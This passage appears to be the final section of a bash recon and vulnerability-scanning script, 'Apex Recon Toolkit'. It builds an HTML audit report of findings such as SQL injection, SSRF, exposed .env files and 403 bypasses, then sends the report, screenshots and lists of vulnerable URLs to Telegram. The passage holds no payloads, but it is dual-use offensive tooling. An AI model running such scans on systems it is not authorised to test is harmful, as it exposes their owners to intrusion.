  </style>
</head>
<body>
  <div class="header">
    <h1>🚀 Apex Recon Toolkit — 34-Step Full Audit Report</h1>
    <p>Target: <strong>${TARGET}</strong> | Mode: <strong>${MODE}</strong> | Time Elapsed: <strong>$(get_elapsed)</strong></p>
  </div>

  <h2>📊 Summary Overview</h2>
  <div class="grid">
    <div class="card"><div class="title">Live HTTP Targets</div><div class="val">${LIVE}</div></div>
    <div class="card"><div class="title">URLs Collected</div><div class="val">${URLS}</div></div>
    <div class="card danger"><div class="title">SQLi Vulnerabilities</div><div class="val">${SQLI}</div></div>
    <div class="card danger"><div class="title">Public Cloud Buckets</div><div class="val">${BUCKETS}</div></div>
    <div class="card danger"><div class="title">JWT Vulnerabilities</div><div class="val">${JWT_VULNS}</div></div>
    <div class="card danger"><div class="title">Prototype Pollution</div><div class="val">${PROTO_POLL}</div></div>
    <div class="card warning"><div class="title">Web Cache Poisoning</div><div class="val">${CACHE_VULNS}</div></div>
    <div class="card warning"><div class="title">WebSocket Issues</div><div class="val">${WS_VULNS}</div></div>
    <div class="card warning"><div class="title">403 Bypasses</div><div class="val">${BYPASS403}</div></div>
    <div class="card danger"><div class="title">CSP Exploit Chains</div><div class="val">${CSPEXPLOIT}</div></div>
    <div class="card danger"><div class="title">Exposed Sensitive Files</div><div class="val">${EXPOSED_FILES}</div></div>
    <div class="card warning"><div class="title">Nuclei DAST Hits</div><div class="val">${DAST_HITS}</div></div>
    <div class="card danger"><div class="title">Engine VERIFIED</div><div class="val">${VERIFIED_FINDINGS}</div></div>
    <div class="card warning"><div class="title">Engine Needs-Review</div><div class="val">${NEEDS_REVIEW}</div></div>
    <div class="card"><div class="title">Engine FP Suppressed</div><div class="val">${FALSE_POS}</div></div>
    <div class="card"><div class="title">OpenAPI Endpoints</div><div class="val">${OPENAPI_EP}</div></div>
    <div class="card"><div class="title">Hidden Params (arjun)</div><div class="val">${ARJUN_PARAMS}</div></div>
    <div class="card"><div class="title">nmap Open Services</div><div class="val">${NMAP_SERVICES}</div></div>
  </div>

  <h2>🚨 Real-time Vulnerability Findings</h2>
HTMLEOF

render_html_table() {
  local title="$1" file="$2" tag_class="$3"
  if [[ -s "$file" ]]; then
    echo "<h3>${title}</h3><table><thead><tr><th>Details / Vulnerable Endpoints</th></tr></thead><tbody>" >> "$HTML_REPORT"
    while IFS= read -r line; do
      safe_line=$(printf '%s' "$line" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g')
      echo "<tr><td><span class=\"tag ${tag_class}\">${title}</span> ${safe_line}</td></tr>" >> "$HTML_REPORT"
    done < "$file"
    echo "</tbody></table>" >> "$HTML_REPORT"
  fi
}

render_html_table "nmap Non-HTTP Services" "$OUT/ports/non-http-services.txt" "high"
render_html_table "Public Cloud Buckets" "$OUT/buckets/open-buckets.txt" "critical"
render_html_table "JWT & Auth Vulnerabilities" "$OUT/jwt/vulnerable.txt" "critical"
render_html_table "Prototype Pollution" "$OUT/proto-pollution/vulnerable.txt" "critical"
render_html_table "SQL Injection" "$OUT/vulns/sqli-findings.txt" "critical"
render_html_table "SSTI Injection" "$OUT/vulns/ssti-findings.txt" "critical"
render_html_table "LFI Path Traversal" "$OUT/vulns/lfi-findings.txt" "high"
render_html_table "Web Cache Poisoning" "$OUT/cache/vulnerable.txt" "high"
render_html_table "WebSocket Vulnerabilities" "$OUT/ws/vulnerable.txt" "high"
render_html_table "CORS Misconfiguration" "$OUT/cors/vulnerable.txt" "medium"
render_html_table "Open Redirect" "$OUT/redirect/vulnerable.txt" "medium"
render_html_table "CSP Exploit Chain (Confirmed)" "$OUT/csp/verified-exploits.txt" "critical"
render_html_table "Clickjacking" "$OUT/csp/clickjacking.txt" "high"
render_html_table "403 Access Bypass" "$OUT/vulns/403-bypass.txt" "high"
render_html_table "Host Header Injection" "$OUT/vulns/host-header.txt" "medium"
render_html_table "Verified Blind SSRF" "$OUT/oob/ssrf-verified.txt" "critical"
render_html_table "Next.js Security Findings" "$OUT/nextjs/vulnerable.txt" "high"
render_html_table "Exposed AI / LLM Endpoints" "$OUT/ai/vulnerable.txt" "critical"
render_html_table "Exposed Sensitive Files (.git/.env)" "$OUT/exposed/findings.txt" "critical"
render_html_table "Nuclei DAST Fuzzing" "$OUT/vulns/dast-findings.txt" "high"
render_html_table "Hidden Parameters (arjun)" "$OUT/params/arjun-found.txt" "medium"
render_html_table "OpenAPI / Swagger Endpoints" "$OUT/urls/openapi-endpoints.txt" "medium"
render_html_table "✅ Engine-VERIFIED Findings" "$OUT/validation/verified.txt" "critical"
render_html_table "🔎 Needs Manual Review" "$OUT/validation/needs-review.txt" "medium"

# Render screenshot gallery if screenshots exist
if [[ -d "$OUT/screens" ]] && ls "$OUT/screens"/*.png >/dev/null 2>&1; then
  echo "<h2>📸 Live Host Screenshots Gallery</h2><div class=\"grid\">" >> "$HTML_REPORT"
  for img in "$OUT/screens"/*.png; do
    bname="$(basename "$img")"
    echo "<div class=\"card\"><img src=\"screens/${bname}\" style=\"width:100%; border-radius:4px; border:1px solid #334155;\"><div style=\"font-size:12px; margin-top:8px; color:var(--accent); font-weight:bold;\">${bname%.png}</div></div>" >> "$HTML_REPORT"
  done
  echo "</div>" >> "$HTML_REPORT"
fi

cat >> "$HTML_REPORT" <<HTMLEOF
</body>
</html>
HTMLEOF

log "Interactive HTML Report generated: $HTML_REPORT"

# Send HTML report document to Telegram
telegram_doc "$HTML_REPORT" "📄 Interactive 34-Step Audit Report for ${TARGET}"

# Deliver the gowitness screenshots to Telegram (as albums, so they land
# together), THEN reclaim the local storage. Only prune if delivery actually
# succeeded — if Telegram isn't configured or the send failed, keep the local
# copies so we never destroy the only copy of the evidence. Note: pruning
# screens/ intentionally breaks the local HTML report's inline gallery (relative
# <img src="screens/..."> ), but the screenshots are now preserved in Telegram
# and the report has already been sent as a standalone document.
if telegram_photos "$OUT/screens" "📸 Live host screenshots — ${TARGET}"; then
  prune_paths "$OUT/screens"
elif ls "$OUT/screens"/*.png >/dev/null 2>&1; then
  warn "Screenshots kept locally (Telegram not configured or send failed) — not deleting to avoid data loss"
fi

telegram "✅ <b>APEX RECON — SCAN COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>$(hesc "$TARGET")</code>
🌐 <b>Live:</b> ${LIVE}   🔗 <b>URLs:</b> ${URLS}
━━━━━━━━━━━━━━━━━━━━━━
🔥 <b>SQLi:</b> ${SQLI}   🪣 <b>Buckets:</b> ${BUCKETS}   🔑 <b>JWT:</b> ${JWT_VULNS}
🧬 <b>PP:</b> ${PROTO_POLL}   ♻️ <b>Cache:</b> ${CACHE_VULNS}   🔌 <b>WS:</b> ${WS_VULNS}
🗂️ <b>Exposed:</b> ${EXPOSED_FILES}   🎯 <b>DAST:</b> ${DAST_HITS}
━━━━━━━━━━━━━━━━━━━━━━
✅ <b>Engine VERIFIED:</b> ${VERIFIED_FINDINGS}   🔎 <b>Needs-Review:</b> ${NEEDS_REVIEW}   🚫 <b>FP Suppressed:</b> ${FALSE_POS}
━━━━━━━━━━━━━━━━━━━━━━
⏱ <b>Total:</b> $(get_elapsed)
📁 <code>$(hesc "$OUT")</code>" "HTML"

# --- Findings digest to Telegram -------------------------------------------
# telegram_findings() builds a per-category list of the actual vulnerable URLs
# but was never wired up, so operators only ever saw counts. Now each non-empty
# finding category is sent as its own message (one per category keeps each well
# under Telegram's 4096-char limit) so you get the real URLs, not just numbers.
telegram "📋 <b>DETAILED FINDINGS</b> — <i>$(hesc "$TARGET")</i>
<i>Each category below lists the actual affected endpoints.</i>" "HTML"
send_findings() {
  local body; body="$(telegram_findings "$1" "$2" "$3" "${4:-15}")"
  [[ -n "$body" ]] && telegram "$body" "HTML"
}
send_findings "🔌" "nmap Non-HTTP Services"      "$OUT/ports/non-http-services.txt"
send_findings "💉" "SQL Injection"            "$OUT/vulns/sqli-findings.txt"
send_findings "⚡" "XSS (dalfox)"             "$OUT/vulns/dalfox-xss.txt"
send_findings "🔮" "Verified Blind SSRF"      "$OUT/oob/ssrf-verified.txt"
send_findings "🛡️" "CSP Exploit Chains"       "$OUT/csp/verified-exploits.txt"
send_findings "🪣" "Open Cloud Buckets"       "$OUT/buckets/open-buckets.txt"
send_findings "🔑" "JWT / Auth Vulns"         "$OUT/jwt/vulnerable.txt"
send_findings "🧬" "Prototype Pollution"      "$OUT/proto-pollution/vulnerable.txt"
send_findings "🧪" "SSTI"                     "$OUT/vulns/ssti-findings.txt"
send_findings "📂" "LFI / Path Traversal"     "$OUT/vulns/lfi-findings.txt"
send_findings "🔄" "CORS Misconfiguration"    "$OUT/cors/vulnerable.txt"
send_findings "🔀" "Open Redirect"            "$OUT/redirect/vulnerable.txt"
send_findings "🚪" "403 Access Bypass"        "$OUT/vulns/403-bypass.txt"
send_findings "🏷️" "Host Header Injection"    "$OUT/vulns/host-header.txt"
send_findings "🤖" "Exposed AI / LLM"         "$OUT/ai/vulnerable.txt"
send_findings "⚡" "Next.js Findings"         "$OUT/nextjs/vulnerable.txt"
send_findings "🗂️" "Exposed Sensitive Files"  "$OUT/exposed/findings.txt"
send_findings "📖" "OpenAPI/Swagger Endpoints" "$OUT/urls/openapi-endpoints.txt"
send_findings "🔎" "Hidden Params (arjun)"    "$OUT/params/arjun-found.txt"
send_findings "🎯" "Nuclei DAST Fuzzing"      "$OUT/vulns/dast-findings.txt"
send_findings "✅" "Engine-VERIFIED"          "$OUT/validation/verified.txt"

# --- Post-Scan Disk Space Cleanup & Log Pruning ---
if [[ "${CLEANUP_TEMP:-true}" == "true" ]]; then
  log "Performing post-scan disk cleanup & temp file pruning..."
  rm -rf /tmp/dalfox_* /tmp/ffuf_* /tmp/nuclei_* /tmp/httpx_* 2>/dev/null || true
  find "$OUT/logs" -type f -name "*.tmp" -delete 2>/dev/null || true
  # Truncate giant debug logs > 10MB to save disk space
  find "$OUT/logs" -type f -size +10M -exec truncate -s 1M {} + 2>/dev/null || true
  log "  ↳ Post-scan disk cleanup complete ✅"
fi
